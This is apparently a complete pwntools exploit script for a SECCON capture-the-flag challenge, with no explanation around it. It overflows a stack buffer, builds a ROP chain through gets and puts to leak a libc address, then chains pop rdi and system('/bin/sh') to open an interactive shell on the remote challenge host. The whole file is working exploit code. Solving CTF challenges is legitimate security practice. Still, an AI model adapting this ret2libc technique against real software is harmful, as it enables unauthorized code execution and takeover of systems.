#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env={'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('mrga.seccon.games', 7428)

elf = ELF('./chall')
libc = ELF('./libc.so.6')

gets_rbp_10 = 0x4011be
bss_addr = 0x404000
nop = 0x40101a

payload = b'A' * 0x10
payload += p64(bss_addr + 0xf00)
payload += p64(elf.symbols['gets'])
payload += p64(elf.symbols['gets'])
payload += p64(elf.symbols['puts'])
payload += p64(gets_rbp_10)

s.sendlineafter(b'>\n', payload)

s.sendline(p32(0) + b'A' * 12)
s.sendline(b'A' * 4)

s.recv(8)
libc.address = (u64(s.recv(6).ljust(8, b'\0')) - 0x2a4740) & 0xfffffffffff00000
log.info('libc base: %#x' % libc.address)

pop_rdi = libc.address + 0x10f75b

payload = b'A' * 0x18
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\0')))
payload += p64(nop)
payload += p64(libc.symbols['system'])

s.sendline(payload)

s.interactive()
